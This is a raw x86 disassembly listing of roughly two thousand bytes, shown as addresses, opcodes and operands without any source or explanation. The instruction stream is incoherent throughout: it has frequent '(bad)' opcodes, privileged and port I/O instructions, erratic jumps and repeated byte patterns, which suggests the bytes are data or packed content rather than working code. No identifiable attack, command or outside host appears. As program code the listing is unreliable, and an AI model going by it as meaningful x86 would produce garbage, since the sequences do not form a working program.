  4256fd:	ja     0x4256ee
  4256ff:	xor    BYTE PTR [edi-0x76],0x80
  425703:	lock mov dl,BYTE PTR [ebx-0x4]
  425707:	push   ebx
  425708:	sub    dh,BYTE PTR [edx-0x454df37a]
  42570e:	sub    edi,edi
  425710:	mov    dl,0x3f
  425712:	ja     0x425698
  425714:	xor    BYTE PTR [edi+0x32],0x80
  425718:	lock xor dl,BYTE PTR [ebx+0x2a]
  42571c:	push   ebx
  42571d:	cld    
  42571e:	mov    dl,0xba
  425720:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425726:	xor    al,0x84
  425729:	arpl   bp,di
  42572b:	or     DWORD PTR [edi-0x4d],ecx
  42572e:	dec    ebp
  42572f:	dec    ebp
  425730:	dec    ebp
  425731:	xor    BYTE PTR [edi-0x7],0x80
  425735:	lock stc 
  425737:	push   ebx
  425738:	cld    
  425739:	push   ebx
  42573a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425740:	or     al,0xab
  425742:	push   DWORD PTR [edx-0x56740f80]
  425748:	push   ebx
  425749:	mov    dl,0xa3
  42574b:	jo     0x425748
  42574d:	out    dx,al
  42574e:	lea    edx,[edi-0x78127880]
  425754:	jno    0x4257a9
  425756:	jo     0x4256eb
  425758:	fwait
  425759:	pop    edi
  42575a:	lock out dx,eax
  42575c:	or     DWORD PTR [edi],ecx
  42575e:	pop    esp
  42575f:	lea    ecx,[ebp+0x905638d]
  425765:	mov    cr1,ebp
  425768:	lea    ecx,[ebp+0x2d995c09]
  42576e:	pop    esi
  42576f:	and    al,0x38
  425771:	lea    ecx,[ebp+0x508af050]
  425777:	lock xor dl,BYTE PTR [ebx-0x9]
  42577b:	push   eax
  42577c:	lock mov edi,DWORD PTR [ecx-0x49460180]
  425783:	jo     0x4257d8
  425785:	dec    ebp
  425786:	jl     0x4257ff
  425788:	enter  0x4d07,0x4d
  42578c:	dec    ebp
  42578d:	mov    ecx,0xc5d3cb63
  425792:	mov    ecx,0xb98ae780
  425797:	mov    dh,0x7c
  425799:	mov    ecx,0x5c098b53
  42579e:	lock mov eax,DWORD PTR [ecx]
  4257a1:	and    esp,ebx
  4257a3:	mov    ecx,0xd70cdf5f
  4257a8:	pop    ebx
  4257a9:	or     DWORD PTR [eax+esi*1+0x50],ebx
  4257ad:	lock enter 0x63b9,0xfd
  4257b2:	xlat   BYTE PTR ds:[ebx]
  4257b3:	iret   
  4257b4:	or     DWORD PTR [eax+esi*8-0x76],ebx
  4257b8:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  4257bf:	aad    0x53
  4257c1:	or     DWORD PTR [eax+esi*8-0x76],ebx
  4257c5:	and    BYTE PTR [edi-0x5f64611],0x21
  4257cc:	pop    ds
  4257cd:	mov    ecx,0x53b9b2b6
  4257d2:	std    
  4257d3:	mov    ecx,0xd5c8f05f
  4257d8:	and    edi,DWORD PTR [edi+esi*2-0x38]
  4257dc:	xchg   BYTE PTR [ebp+0x4d],cl
  4257df:	dec    ebp
  4257e0:	dec    ebp
  4257e1:	ja     0x42576e
  4257e3:	cmp    ch,0xb9
  4257e6:	push   ebx
  4257e7:	mov    cl,0x2d
  4257e9:	mov    ecx,0x5fb970b6
  4257ee:	lock mov esp,esp
  4257f1:	cmc    
  4257f2:	les    esp,FWORD PTR [esi+0x7c32774d]
  4257f8:	ja     0x4257c2
  4257fa:	mov    esi,0x94d4d4d
  4257ff:	pop    esp
  425800:	out    0x8a,eax
  425802:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425809:	sub    edx,ebp
  42580b:	pop    ss
  42580c:	dec    ebp
  42580d:	ja     0x425799
  42580f:	in     eax,dx
  425810:	out    0xc8,eax
  425812:	xchg   BYTE PTR [ecx],cl
  425814:	dec    edi
  425815:	ror    BYTE PTR [ebp+0x4d],1
  425818:	dec    ebp
  425819:	push   ebx
  42581a:	push   0xffffffab
  42581c:	mov    ds:0x8deefb70,eax
  425821:	xor    al,0x32
  425824:	mov    ecx,0x53b9b2b6
  425829:	std    
  42582a:	push   ebx
  42582b:	push   0xffffffb9
  42582d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425833:	les    eax,FWORD PTR [edx]
  425835:	xchg   edi,eax
  425836:	add    BYTE PTR [edi-0x6c427813],0x99
  42583d:	fwait
  42583e:	loop   0x425885
  425840:	dec    ebp
  425841:	xlat   BYTE PTR ds:[ebx]
  425842:	out    dx,eax
  425843:	xor    BYTE PTR [edx],0x86
  425846:	inc    ebx
  425847:	mov    ecx,DWORD PTR [ebp+0x4d]
  42584a:	add    DWORD PTR [ecx-0x40],edi
  42584d:	push   eax
  42584e:	ja     0x425876
  425850:	add    DWORD PTR [ecx+0x75],edi
  425853:	push   eax
  425854:	ja     0x425884
  425856:	add    DWORD PTR [ecx-0x47],edi
  425859:	push   eax
  42585a:	ja     0x425892
  42585c:	add    DWORD PTR [eax+edx*1-0x73],ecx
  425860:	lea    ecx,[ebp+0x13e7750]
  425866:	dec    esp
  425867:	cmc    
  425868:	lea    ecx,[ebp+0x4677508d]
  42586e:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  425872:	lea    ecx,[ebp+0x1627750]
  425878:	dec    esp
  425879:	mov    BYTE PTR [ebp+0x77508d8d],cl
  42587f:	push   esi
  425880:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  425884:	lea    ecx,[ebp+0x15e7750]
  42588a:	dec    esp
  42588b:	aam    0x3a
  42588d:	lea    ecx,[ebp+0x50667750]
  425893:	xlat   BYTE PTR ds:[ebx]
  425894:	push   ds
  425895:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  425899:	lea    ecx,[ebp-0x7f9588b0]
  42589f:	dec    esp
  4258a0:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  4258a7:	jb     0x4258f9
  4258a9:	xchg   edi,eax
  4258aa:	not    DWORD PTR [eax-0x69]
  4258ad:	jp     0x4258ff
  4258af:	xchg   edi,eax
  4258b0:	adc    BYTE PTR [eax-0x69],0x83
  4258b4:	jl     0x42592d
  4258b6:	std    
  4258b7:	(bad)  [esi-0x79a1ee21]
  4258bd:	pop    DWORD PTR [ebx+0x26]
  4258c0:	push   eax
  4258c1:	ja     0x425872
  4258c3:	xor    al,0xfd
  4258c6:	and    bh,0xaf
  4258c9:	push   ebx
  4258ca:	mov    esp,DWORD PTR [edx-0x20a724fb]
  4258d0:	adc    DWORD PTR [ecx],ecx
  4258d2:	inc    esi
  4258d3:	retf   
  4258d4:	or     al,0xb2
  4258d6:	popa   
  4258d7:	or     al,0x50
  4258d9:	out    0xf9,eax
  4258db:	and    bh,0xfd
  4258de:	and    BYTE PTR [edi+0x53ac80af],0x4d
  4258e5:	push   ebx
  4258e6:	test   DWORD PTR [edx+0x2aff29b4],esi
  4258ec:	and    bh,0xf9
  4258ef:	icebp  
  4258f0:	lea    ecx,[ebp+0x353cd8d]
  4258f6:	inc    DWORD PTR [esi]
  4258f8:	jmp    FWORD PTR [edx]
  4258fa:	push   eax
  4258fb:	xlat   BYTE PTR ds:[ebx]
  4258fc:	mov    ecx,DWORD PTR [ecx]
  4258fe:	(bad)  
  425900:	lea    ecx,[ebp-0x8885d73]
  425906:	rcr    ebp,0x86
  425909:	outs   dx,DWORD PTR ds:[esi]
  42590a:	pusha  
  42590b:	mov    esi,0xe26438f
  425910:	lock jp 0x4258b5
  425913:	ja     0x425897
  425915:	rcr    ebp,0x52
  425918:	or     al,0xe
  42591a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425922:	and    bh,0xfd
  425925:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42592c:	fistp  DWORD PTR [eax-0x21]
  42592f:	adc    DWORD PTR [ecx],ecx
  425931:	inc    esi
  425932:	add    eax,0x29bcb20c
  425937:	mov    dl,0x88
  425939:	or     al,0x53
  42593b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42593c:	push   ebx
  42593d:	test   edi,edi
  42593f:	adc    edi,edi
  425941:	dec    ebx
  425942:	in     eax,dx
  425943:	mov    dl,0x4d
  425945:	in     eax,dx
  425946:	jle    0x425995
  425948:	push   eax
  425949:	lock std 
  42594b:	push   eax
  42594c:	xlat   BYTE PTR ds:[ebx]
  42594d:	scas   eax,DWORD PTR es:[edi]
  42594e:	xor    al,0xf7
  425951:	push   eax
  425953:	jp     0x42592a
  425955:	and    esp,DWORD PTR [edx+0x36ff777]
  42595b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42595c:	retf   
  42595d:	pusha  
  42595e:	sbb    edi,edx
  425960:	jp     0x425915
  425962:	push   cs
  425963:	lock jp 0x425908
  425966:	ja     0x4258ea
  425968:	sti    
  425969:	jl     0x425947
  42596b:	int3   
  42596c:	push   cs
  42596d:	lock add esp,0x1d
  425971:	mov    ds:0xddc1f7f0,al
  425976:	xchg   BYTE PTR [ecx+0x30],bh
  425979:	ja     0x4259f5
  42597b:	mov    ds:0xddc182b7,al
  425980:	push   edx
  425981:	jmp    0x438f:0xbe83b7a2
  425988:	es xor al,0xfd
  42598c:	xor    al,0xaf
  42598f:	and    bh,0xfd
  425992:	and    BYTE PTR [edi+0x63609af],0xc
  425999:	mov    dl,0xbe
  42599b:	sub    DWORD PTR [ebx+0xb],edx
  42599e:	inc    esi
  4259a0:	mov    dl,0xbc
  4259a2:	or     al,0xff
  4259a4:	sub    ah,BYTE PTR [edx-0x20a726fb]
  4259aa:	adc    DWORD PTR [eax-0x10],edx
  4259ad:	std    
  4259ae:	push   ebx
  4259af:	xor    dl,BYTE PTR [eax-0x29]
  4259b2:	scas   eax,DWORD PTR es:[edi]
  4259b3:	xor    al,0xfd
  4259b6:	adc    bh,0xaf
  4259b9:	and    bh,0xfd
  4259bc:	and    BYTE PTR [edi-0x5dcdac51],0x5
  4259c3:	fistp  DWORD PTR [eax-0x21]
  4259c6:	adc    DWORD PTR [ecx],ecx
  4259c8:	inc    esi
  4259c9:	add    eax,0x29bcb20c
  4259ce:	mov    dl,0x88
  4259d0:	or     al,0x53
  4259d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259d3:	push   ebx
  4259d4:	test   edi,edi
  4259d6:	adc    edi,edi
  4259d8:	dec    ebx
  4259d9:	call   DWORD PTR [ecx+0x9]
  4259dc:	dec    edi
  4259dd:	ror    BYTE PTR [ebp+0x4d],0x4d
  4259e1:	adc    bh,0x8b
  4259e4:	dec    edi
  4259e5:	or     ecx,DWORD PTR [ecx]
  4259e7:	mov    cr1,ebp
  4259ea:	lea    ecx,[ebp-0x7f9a8680]
  4259f0:	in     eax,0x81
  4259f2:	fucomp st(4)
  4259f4:	or     eax,0x80359b80
  4259f9:	leave  
  4259fa:	and    eax,0x802d7b80
  4259ff:	stos   DWORD PTR es:[edi],eax
  425a00:	sbb    eax,0x97507eec
  425a05:	scas   eax,DWORD PTR es:[edi]
  425a06:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a0d:	push   eax
  425a0e:	lock xchg DWORD PTR [eax+0x77],edx
  425a12:	jp     0x425a64
  425a14:	xchg   edi,eax
  425a15:	enter  0x9463,0xdb
  425a19:	in     al,dx
  425a1a:	push   eax
  425a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a1c:	enter  0x7253,0x50
  425a20:	xchg   edi,eax
  425a21:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a25:	(bad)  
  425a27:	(bad)  
  425a28:	in     al,dx
  425a29:	xor    BYTE PTR [edi+0x7a],0x80
  425a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a2e:	scas   eax,DWORD PTR es:[edi]
  425a2f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a33:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a39:	stos   DWORD PTR es:[edi],eax
  425a3a:	adc    eax,0xee80a9d3
  425a3f:	pop    edx
  425a40:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a47:	xchg   edi,eax
  425a48:	mov    ch,ah
  425a4a:	cld    
  425a4b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425a51:	xchg   edi,eax
  425a52:	out    dx,eax
  425a53:	push   eax
  425a54:	ja     0x425a88
  425a56:	push   eax
  425a57:	xchg   edi,eax
  425a58:	jbe    0x425ad6
  425a5a:	ja     0x425a55
  425a5c:	dec    DWORD PTR [ebp-0x687f7273]
  425a62:	mov    ch,ch
  425a64:	(bad)  
  425a65:	(bad)  
  425a66:	xlat   BYTE PTR ds:[ebx]
  425a67:	sub    DWORD PTR [edx],ecx
  425a69:	xor    BYTE PTR [edi+0x76],0x80
  425a6d:	push   ebp
  425a6e:	jno    0x4259f6
  425a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a71:	mov    cl,BYTE PTR [ebp+0x4d]
  425a74:	adc    bh,0x8b
  425a77:	xor    al,0x87
  425a7a:	dec    edi
  425a7b:	push   0xffffffd5
  425a7d:	das    
  425a7e:	xor    BYTE PTR [edi-0x76],0x50
  425a82:	sbb    eax,0xed327780
  425a87:	ja     0x425a13
  425a89:	out    dx,al
  425a8a:	dec    ebp
  425a8b:	lock stc 
  425a8d:	xlat   BYTE PTR ds:[ebx]
  425a8e:	mov    dh,0x80
  425a90:	xchg   edi,eax
  425a91:	sbb    eax,0x50
  425a94:	xchg   edi,eax
  425a95:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425a99:	in     al,0xdc
  425a9b:	stos   DWORD PTR es:[edi],eax
  425a9c:	cmp    ah,0xa9
  425a9f:	mov    ds:0x8deefb70,eax
  425aa4:	xchg   edi,eax
  425aa5:	add    BYTE PTR [edi-0x10287f67],0x4d
  425aac:	loopne 0x425ae0
  425aae:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425ab4:	xchg   ch,ah
  425ab6:	int3   
  425ab7:	dec    ebp
  425ab8:	dec    ebp
  425ab9:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425abe:	lea    edx,[ebx+0x70]
  425ac1:	pop    edi
  425ac2:	out    dx,eax
  425ac3:	test   eax,0x80b21809
  425ac8:	mov    dl,0xa7
  425aca:	sti    
  425acb:	out    dx,al
  425acc:	lea    eax,[eax-0x72c5e1e4]
  425ad2:	lea    edx,[ebx+0x5e328099]
  425ad8:	and    al,0x38
  425ada:	lea    ecx,[ebp-0x2ac5e3c]
  425ae0:	mov    ecx,0x50b970b6
  425ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ae6:	in     eax,dx
  425ae7:	sti    
  425ae8:	or     al,0xed
  425aea:	cld    
  425aeb:	or     al,0x9
  425aed:	pop    esp
  425aee:	mov    eax,ds:0xd7fd63b9
  425af3:	pop    es
  425af4:	push   ebx
  425af5:	push   0xffffffa9
  425af7:	mov    ecx,0xce800c50
  425afc:	push   ds
  425afd:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b03:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b0a:	lea    esi,[edx+0x7cec6fbc]
  425b10:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b16:	mov    esi,0x6def10bd
  425b1b:	fmul   DWORD PTR [edi-0x7934325a]
  425b21:	xlat   BYTE PTR ds:[ebx]
  425b22:	popa   
  425b23:	cld    
  425b24:	lea    ecx,[ebp+0x3a1e4c80]
  425b2a:	lea    ecx,[ebp+0x74ab7cec]
  425b30:	xchg   edi,eax
  425b31:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b38:	lea    edx,[ebx+0x438f8660]
  425b3e:	es cdq 
  425b40:	fwait
  425b41:	jl     0x425bba
  425b43:	enter  0x58e4,0xdf
  425b47:	adc    DWORD PTR [eax-0x10],edx
  425b4a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b4e:	fstp   DWORD PTR [eax-0x21]
  425b51:	adc    DWORD PTR [eax-0x10],edx
  425b54:	xor    dl,BYTE PTR [ebx+0x6a]
  425b57:	jl     0x425bd0
  425b59:	xchg   dh,dh
  425b5b:	and    al,0x6f
  425b5d:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425b61:	cmc    
  425b62:	and    al,0x6f
  425b64:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425b68:	call   0x50543ac5
  425b6d:	lock jp 0x425bec
  425b70:	ja     0x425bd0
  425b72:	out    0x58,al
  425b74:	fist   WORD PTR [ecx]
  425b76:	push   eax
  425b77:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425b7d:	xchg   edi,eax
  425b7e:	xor    cl,BYTE PTR [ecx]
  425b80:	inc    esi
  425b81:	test   DWORD PTR [edx+esi*4],0x97800c07
  425b88:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425b8e:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425b92:	add    al,0xd4
  425b94:	push   ebx
  425b95:	jl     0x425bea
  425b97:	or     edi,edi
  425b99:	cld    
  425b9a:	push   eax
  425b9b:	ja     0x425b20
  425b9d:	add    DWORD PTR [edi-0x7c],esi
  425ba0:	push   eax
  425ba1:	ja     0x425b52
  425ba3:	xor    BYTE PTR [edi-0x51],0xfa
  425ba7:	and    ah,BYTE PTR [edi+ebp*2]
  425baa:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425bae:	pop    eax
  425baf:	fist   WORD PTR [ecx]
  425bb1:	push   eax
  425bb2:	jge    0x425ba2
  425bb4:	xor    al,0x8a
  425bb7:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425bbe:	or     al,0xe2
  425bc0:	or     eax,0xb2f7539d
  425bc5:	clc    
  425bc6:	sub    edi,edi
  425bc8:	inc    BYTE PTR [eax-0x587f7569]
  425bce:	mov    dl,BYTE PTR [ebx+0x7e]
  425bd1:	mov    dl,0x7
  425bd3:	or     al,0x53
  425bd5:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425bdc:	inc    BYTE PTR [eax-0x587f7569]
  425be2:	mov    dl,BYTE PTR [ebx+0x7e]
  425be5:	mov    dl,0x7
  425be7:	or     al,0x53
  425be9:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425bf0:	inc    BYTE PTR [eax-0x587f7569]
  425bf6:	mov    dl,BYTE PTR [ebx+0x7e]
  425bf9:	mov    dl,0x7
  425bfb:	or     al,0x53
  425bfd:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c04:	(bad)  
  425c05:	push   eax
  425c06:	add    DWORD PTR [edx+0x4d],edx
  425c09:	dec    ebp
  425c0a:	dec    ebp
  425c0b:	xor    al,0x86
  425c0e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c15:	mov    dl,0xf8
  425c17:	sub    DWORD PTR [edx-0x100f342],esi
  425c1d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c24:	jle    0x425c79
  425c26:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c2d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c34:	dec    ebp
  425c35:	dec    ebp
  425c36:	xor    al,0x21
  425c39:	xor    BYTE PTR [eax],0x80
  425c3c:	xchg   edi,eax
  425c3d:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425c43:	or     dl,BYTE PTR [ebx-0x7e]
  425c46:	push   ebx
  425c47:	jle    0x425bfb
  425c49:	pop    es
  425c4a:	or     al,0xb2
  425c4c:	mov    ah,0x29
  425c4e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c55:	dec    ebp
  425c56:	dec    ebp
  425c57:	xor    al,0x71
  425c5a:	adc    BYTE PTR [edi+0x53f75371],0x51
  425c61:	mov    dl,0xf8
  425c63:	sub    DWORD PTR [edx-0x100f342],esi
  425c69:	adc    BYTE PTR [edi-0x75587f76],0x53
  425c70:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425c77:	pop    es
  425c78:	or     al,0xb2
  425c7a:	mov    ah,0x29
  425c7c:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425c83:	mov    dl,0x86
  425c85:	or     al,0xed
  425c87:	(bad)  
  425c88:	or     eax,0xff29b4b2
  425c8d:	je     0x425c7b
  425c8f:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425c99:	dec    ebp
  425c9a:	xor    al,0x15
  425c9d:	in     eax,dx
  425c9e:	add    eax,0x29bab20d
  425ca3:	push   ebx
  425ca4:	cld    
  425ca5:	mov    dl,0x86
  425ca7:	or     al,0xff
  425ca9:	mov    dl,0x80
  425cab:	lock mov al,BYTE PTR [eax-0x3d127569]
  425cb2:	or     eax,0xf8b25153
  425cb7:	sub    DWORD PTR [edx-0x100f342],esi
  425cbd:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cc4:	jle    0x425cb3
  425cc6:	(bad)  
  425cc7:	or     eax,0xb20c07b2
  425ccc:	mov    ah,0x29
  425cce:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425cd5:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425cdc:	or     eax,0xb229b4b2
  425ce1:	pop    es
  425ce2:	or     al,0xff
  425ce4:	xchg   esp,eax
  425ce5:	in     al,dx
  425ce6:	(bad)  
  425ce7:	push   eax
  425ce8:	xend   
  425ceb:	dec    ebp
  425cec:	dec    ebp
  425ced:	dec    ebp
  425cee:	add    DWORD PTR [edi+0x52],ecx
  425cf1:	dec    ebp
  425cf2:	dec    ebp
  425cf3:	dec    ebp
  425cf4:	or     al,BYTE PTR [eax-0xf7f7589]
  425cfa:	mov    ah,dl
  425cfc:	or     eax,0x53fc53a3
  425d01:	adc    DWORD PTR [edx-0x454df37a],esi
  425d07:	sub    edi,edi
  425d09:	mov    dl,0xa
  425d0b:	xor    BYTE PTR [edi+0x2d],0x1
  425d0f:	adc    ch,dh
  425d11:	lea    ecx,[ebp-0x327f6973]
  425d17:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d1e:	xchg   edi,eax
  425d1f:	and    eax,0x5055f080
  425d24:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d2a:	stc    
  425d2b:	or     DWORD PTR [esi-0x3],eax
  425d2e:	or     al,0xb2
  425d30:	mov    esi,0x84f0800c
  425d35:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d3c:	push   edi
  425d3e:	stos   BYTE PTR es:[edi],al
  425d3f:	dec    ebp
  425d40:	xlat   BYTE PTR ds:[ebx]
  425d41:	xor    eax,0x4d29bab2
  425d46:	xlat   BYTE PTR ds:[ebx]
  425d47:	inc    ebp
  425d48:	xchg   ah,cl
  425d4a:	add    eax,0x77804d4d
  425d4f:	test   BYTE PTR [eax+0x4609f9f0],al
  425d55:	std    
  425d56:	or     al,0xb2
  425d58:	mov    esi,0x84f0800c
  425d5d:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d64:	push   edi
  425d66:	stos   BYTE PTR es:[edi],al
  425d67:	dec    ebp
  425d68:	xlat   BYTE PTR ds:[ebx]
  425d69:	push   ebp
  425d6a:	mov    dl,0xba
  425d6c:	sub    DWORD PTR [ebp-0x29],ecx
  425d6f:	cmp    eax,0x4d059886
  425d74:	dec    ebp
  425d75:	xor    BYTE PTR [edi-0x76],0x80
  425d79:	lock mov dl,BYTE PTR [ebx+0x11]
  425d7d:	mov    dl,0xba
  425d7f:	sub    DWORD PTR [ebx-0x4],edx
  425d82:	mov    dl,0x86
  425d84:	or     al,0xff
  425d86:	mov    dl,0x80
  425d88:	lock mov al,BYTE PTR [eax+0x51538a97]
  425d8f:	mov    dl,0xbe
  425d91:	or     al,0x53
  425d93:	xchg   esp,eax
  425d94:	mov    dl,0xf8
  425d96:	sub    edi,edi
  425d98:	(bad)  
  425d99:	in     al,dx
  425d9a:	mov    dl,0x80
  425d9c:	lock mov al,BYTE PTR [eax+0x51538a97]
  425da3:	mov    dl,0xbe
  425da5:	or     al,0x53
  425da7:	xchg   esp,eax
  425da8:	mov    dl,0xf8
  425daa:	sub    edi,edi
  425dac:	(bad)  
  425dad:	in     al,dx
  425dae:	mov    dl,0x80
  425db0:	lock mov al,BYTE PTR [eax+0x51538a97]
  425db7:	mov    dl,0xbe
  425db9:	or     al,0x53
  425dbb:	xchg   esp,eax
  425dbc:	mov    dl,0xf8
  425dbe:	sub    edi,edi
  425dc0:	(bad)  
  425dc1:	in     al,dx
  425dc2:	mov    dl,0x50
  425dc4:	dec    edi
  425dc5:	push   edx
  425dc6:	dec    ebp
  425dc7:	dec    ebp
  425dc8:	dec    ebp
  425dc9:	xor    BYTE PTR [edi+0x55],0x80
  425dcd:	lea    eax,[eax-0x687f7910]
  425dd3:	xchg   BYTE PTR [ebx+0x51],dl
  425dd6:	push   ebx
  425dd7:	xchg   esp,eax
  425dd8:	mov    dl,0xbe
  425dda:	or     al,0xb2
  425ddc:	clc    
  425ddd:	sub    edi,edi
  425ddf:	(bad)  
  425de0:	push   eax
  425de1:	xend   
  425de4:	dec    ebp
  425de5:	dec    ebp
  425de6:	dec    ebp
  425de7:	xor    BYTE PTR [edi+0x21],0x80
  425deb:	lea    eax,[eax-0x687f7510]
  425df1:	mov    dl,BYTE PTR [ebx+0x51]
  425df4:	mov    dl,0xbe
  425df6:	or     al,0x80
  425df8:	ins    DWORD PTR es:[edi],dx
  425df9:	or     dl,BYTE PTR [ebx-0x6c]
  425dfc:	mov    dl,0xf8
  425dfe:	sub    edi,edi
  425e00:	(bad)  
  425e01:	push   eax
  425e02:	xend   
  425e05:	dec    ebp
  425e06:	dec    ebp
  425e07:	dec    ebp
  425e08:	xor    BYTE PTR [edi+0x1d],0x80
  425e0c:	lock sbb eax,0xbab21153
  425e12:	sub    DWORD PTR [ebx-0x4],edx
  425e15:	mov    dl,0x86
  425e17:	or     al,0xff
  425e19:	mov    dl,0x80
  425e1b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e22:	push   ebx
  425e23:	push   ecx
  425e24:	mov    dl,0xf8
  425e26:	sub    DWORD PTR [edx-0x100f342],esi
  425e2c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e33:	jle    0x425de7
  425e35:	pop    es
  425e36:	or     al,0xed
  425e38:	(bad)  
  425e39:	or     eax,0xff29b4b2
  425e3e:	xchg   esp,eax
  425e3f:	in     al,dx
  425e40:	(bad)  
  425e41:	push   eax
  425e42:	xend   
  425e45:	dec    ebp
  425e46:	dec    ebp
  425e47:	dec    ebp
  425e48:	xor    BYTE PTR [edi-0x76],0x80
  425e4c:	lock mov ch,ch
  425e4f:	add    eax,0x29bab20d
  425e54:	push   ebx
  425e55:	cld    
  425e56:	mov    dl,0x86
  425e58:	or     al,0xff
  425e5a:	mov    dl,0x80
  425e5c:	lock mov al,BYTE PTR [eax-0x3d127569]
  425e63:	or     eax,0xf8b25153
  425e68:	sub    DWORD PTR [edx-0x100f342],esi
  425e6e:	in     al,dx
  425e6f:	mov    dl,0x80
  425e71:	lock mov al,BYTE PTR [eax-0x3d127569]
  425e78:	or     eax,0xf8b25153
  425e7d:	sub    DWORD PTR [edx-0x100f342],esi
  425e83:	add    DWORD PTR [eax],ebx
  425e85:	push   edx
  425e86:	dec    ebp
  425e87:	dec    ebp
  425e88:	dec    ebp
  425e89:	stos   BYTE PTR es:[edi],al
  425e8a:	adc    BYTE PTR [edi-0x75587f76],0xec
  425e91:	mov    dl,0x53
  425e93:	jle    0x425e96
  425e95:	lock adc DWORD PTR [eax+0x41],0x4f
  425e9a:	aad    0x4d
  425e9c:	dec    ebp
  425e9d:	dec    ebp
  425e9e:	xor    BYTE PTR [edi+0x2d],0xed
  425ea2:	(bad)  
  425ea3:	or     eax,0xb20c07b2
  425ea8:	mov    ah,0x29
  425eaa:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425eb1:	lea    eax,[eax-0x72c5c133]
  425eb7:	lea    ebp,[edx+0x4d814d96]
  425ebd:	xchg   edi,eax
  425ebe:	and    eax,0xbdd56a4f
  425ec3:	xor    BYTE PTR [edi-0x79],0x80
  425ec7:	lock xor cl,BYTE PTR [ecx]
  425eca:	inc    esi
  425ecb:	std    
  425ecc:	or     al,0xb2
  425ece:	mov    esi,0x80b6800c
  425ed3:	std    
  425ed4:	xor    BYTE PTR [edi-0x79],0x80
  425ed8:	xchg   edi,eax
  425ed9:	xor    dl,BYTE PTR [ebx+0x72]
  425edc:	push   ebx
  425edd:	sub    dh,BYTE PTR [edx+0x77802984]
  425ee3:	and    edi,edi
  425ee5:	inc    BYTE PTR [eax+0xada6371]
  425eeb:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425ef2:	and    BYTE PTR [edi-0xda707f],0x10
  425ef9:	and    eax,0xc87780ef
  425efe:	xor    al,0x8b
  425f01:	or     DWORD PTR [esi-0x3],eax
  425f04:	or     al,0xb2
  425f06:	mov    esi,0xc8f0800c
  425f0b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f12:	mov    dl,0xba
  425f14:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f1a:	in     al,dx
  425f1b:	std    
  425f1c:	xor    BYTE PTR [edi+0x21],0x80
  425f20:	sbb    eax,0x500a0063
  425f25:	lock jno 0x425f0c
  425f28:	jl     0x425eee
  425f2a:	outs   dx,DWORD PTR ds:[esi]
  425f2b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f33:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f3a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f41:	lea    ecx,[ebp+0x71f0508d]
  425f47:	and    BYTE PTR [esi+0x4381a780],0x11
  425f4e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425f55:	and    BYTE PTR [esi-0x7fc28214],0x77
  425f5c:	xchg   DWORD PTR [eax-0x10],edx
  425f5f:	scas   eax,DWORD PTR es:[edi]
